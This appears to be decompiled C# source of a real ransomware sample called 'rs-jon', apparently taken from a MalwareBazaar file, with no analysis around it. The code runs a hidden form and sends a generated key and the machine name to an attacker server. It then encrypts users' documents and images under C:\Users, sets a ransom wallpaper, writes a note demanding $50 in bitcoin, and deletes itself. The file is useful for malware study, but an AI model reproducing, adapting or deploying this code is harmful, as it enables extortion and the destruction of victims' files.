// Decompiled with JetBrains decompiler
// Type: rs_jon.Form1
// Assembly: rs-jon, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8B269CEF-B9D4-491A-AA9A-0FE255D6545E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.07-msil\HEUR-Trojan-Ransom.MSIL.Agent.gen-9a8e948d568d464223fd51d4dc5495ca51d93bcfd4210ff7f57518378763fd8e.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace rs_jon
{
  public class Form1 : Form
  {
    private string extension = ".rsjon";
    private string targetURL = "http://darkjon.tk/rnsm/write.php";
    private string BTCAdress = "1AefQmfitXAuQDm1BSNpTN6mygpePd3MT6";
    private string contactMail = "darkjon@protonmail.com";
    private static string userDir = "C:\\";
    private static string userName = Environment.UserName;
    private static string path_1 = "Users\\";
    private string desktoppath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
    private string documentpath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
    private string downloads = Form1.userDir + Form1.path_1 + Environment.UserName + "\\Downloads";
    private string user = Environment.UserName;
    private string computername = Environment.MachineName.ToString();
    private string userdir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\";
    private static uint SPI_SETDESKWALLPAPER = 20;
    private static uint SPIF_UPDATEINIFILE = 1;
    private IContainer components = (IContainer) null;

    public Form1()
    {
      this.InitializeComponent();
      this.FormBorderStyle = FormBorderStyle.None;
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Opacity = 0.0;
      this.ShowInTaskbar = false;
      if (Form1.CheckInternetConnection())
      {
        this.startAction();
        this.self_destruck();
      }
      else
      {
        int num = (int) MessageBox.Show("This Program Needs Internet Connection. Please Try Again Later.", "Internet Connection Error!", MessageBoxButtons.OKCancel, MessageBoxIcon.Hand);
        Application.Exit();
      }
    }

    public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
    {
      byte[] numArray = (byte[]) null;
      byte[] salt = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
          rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
          rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
          rijndaelManaged.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
            cryptoStream.Close();
          }
          numArray = memoryStream.ToArray();
        }
      }
      return numArray;
    }

    public string CreatePassword(int length)
    {
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      while (0 < length--)
        stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
      return stringBuilder.ToString();
    }

    public void EncryptFile(string file, string password)
    {
      byte[] bytesToBeEncrypted = System.IO.File.ReadAllBytes(file);
      byte[] bytes1 = Encoding.UTF8.GetBytes(password);
      byte[] hash = SHA256.Create().ComputeHash(bytes1);
      byte[] bytes2 = this.AES_Encrypt(bytesToBeEncrypted, hash);
      System.IO.File.WriteAllBytes(file, bytes2);
      System.IO.File.Move(file, file + this.extension);
    }

    public void encryptDirectory(string location, string password)
    {
      try
      {
        string[] source = new string[23]
        {
          ".txt",
          ".doc",
          ".docx",
          ".xls",
          ".xlsx",
          ".ppt",
          ".pptx",
          ".odt",
          ".jpg",
          ".png",
          ".csv",
          ".sql",
          ".mdb",
          ".sln",
          ".php",
          ".asp",
          ".aspx",
          ".html",
          ".xml",
          ".psd",
          ".rtf",
          ".pdf",
          ".jpeg"
        };
        string[] files = Directory.GetFiles(location);
        string[] directories = Directory.GetDirectories(location);
        for (int index = 0; index < files.Length; ++index)
        {
          string extension = Path.GetExtension(files[index]);
          if (((IEnumerable<string>) source).Contains<string>(extension))
            this.EncryptFile(files[index], password);
        }
        for (int index = 0; index < directories.Length; ++index)
          this.encryptDirectory(directories[index], password);
      }
      catch (Exception ex)
      {
      }
    }

    public static bool CheckInternetConnection()
    {
      try
      {
        using (WebClient webClient = new WebClient())
        {
          using (webClient.OpenRead("http://www.google.com"))
            return true;
        }
      }
      catch
      {
        return false;
      }
    }

    public void startAction()
    {
      string password = this.CreatePassword(15);
      this.SendPassword(password);
      Form1.changewallpaper();
      this.Directory_Settings_Sending(password);
      this.messageCreator();
    }

    public string serial()
    {
      Random random1 = new Random();
      Random random2 = new Random();
      int num = random1.Next(1000, 9999);
      string str1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
      string str2 = "";
      for (int index = 0; index < 5; ++index)
        str2 += str1[random2.Next(str1.Length)].ToString();
      return (this.user + "-" + num.ToString() + "-" + str2).ToString();
    }

    public void SendPassword(string password) => new WebClient().DownloadString(this.targetURL + ("?computer_name=" + this.computername + "&serialnumber=" + this.serial() + "&password=" + password + "&allow=ransom"));

    public void messageCreator()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\READ_ME_PLZ.txt";
      if (System.IO.File.Exists(path))
        return;
      string[] contents = new string[6]
      {
        "Files has been encrypted with rs-jon",
        "Send me some bitcoins or kebab",
        "ur serial number is " + this.serial(),
        "send me $50 worth BTC in these adress = " + this.BTCAdress,
        "then send me mail with ur serial number with proof of payment like shit.",
        this.contactMail ?? ""
      };
      System.IO.File.WriteAllLines(path, contents);
    }

    public void self_destruck()
    {
      string path = Path.GetTempFileName() + ".bat";
      using (StreamWriter streamWriter = new StreamWriter(path))
      {
        streamWriter.WriteLine("@echo off");
        streamWriter.WriteLine("timeout 3 > NUL");
        streamWriter.WriteLine("CD " + Application.StartupPath);
        streamWriter.WriteLine("DEL \"" + Path.GetFileName(Application.ExecutablePath) + "\" /f /q");
        streamWriter.WriteLine("CD " + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ex");
        streamWriter.WriteLine("DEL \"wallpaper.jpg\" /f /q ");
        streamWriter.WriteLine("CD " + Path.GetTempPath());
        streamWriter.WriteLine("DEL \"" + Path.GetFileName(path) + "\" /f /q");
      }
      Process.Start(new ProcessStartInfo()
      {
        FileName = path,
        CreateNoWindow = true,
        ErrorDialog = false,
        UseShellExecute = false,
        WindowStyle = ProcessWindowStyle.Hidden
      });
      Environment.Exit(0);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(
      uint uiAction,
      uint uiParam,
      string pvParam,
      uint fWinIni);

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    public static void changewallpaper()
    {
      try
      {
        Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ex");
        string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ex\\wallpaper.jpg";
        Resource1.wallpaper.Save(str);
        Form1.SystemParametersInfo(Form1.SPI_SETDESKWALLPAPER, 1U, str, Form1.SPIF_UPDATEINIFILE);
      }
      catch
      {
        WebClient webClient = new WebClient();
        string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ex\\wallpaper.jpg";
        webClient.DownloadFile("http://darkjon.tk/wallpaper.jpg", str);
        Form1.SystemParametersInfo(Form1.SPI_SETDESKWALLPAPER, 1U, str, Form1.SPIF_UPDATEINIFILE);
      }
    }

    public void Directory_Settings_Sending(string password)
    {
      string str1 = "Users\\";
      string str2 = Form1.userDir + str1 + Form1.userName + "\\Desktop";
      string str3 = Form1.userDir + str1 + Form1.userName + "\\Links";
      string str4 = Form1.userDir + str1 + Form1.userName + "\\Contacts";
      string str5 = Form1.userDir + str1 + Form1.userName + "\\Desktop";
      string str6 = Form1.userDir + str1 + Form1.userName + "\\Documents";
      string str7 = Form1.userDir + str1 + Form1.userName + "\\Downloads";
      string str8 = Form1.userDir + str1 + Form1.userName + "\\Pictures";
      string str9 = Form1.userDir + str1 + Form1.userName + "\\Music";
      string str10 = Form1.userDir + str1 + Form1.userName + "\\OneDrive";
      string str11 = Form1.userDir + str1 + Form1.userName + "\\Saved Games";
      string str12 = Form1.userDir + str1 + Form1.userName + "\\Favorites";
      string str13 = Form1.userDir + str1 + Form1.userName + "\\Searches";
      string str14 = Form1.userDir + str1 + Form1.userName + "\\Videos";
      this.encryptDirectory("C:\\Users", password);
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(120, 0);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowInTaskbar = false;
      this.Text = nameof (Form1);
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }
  }
}
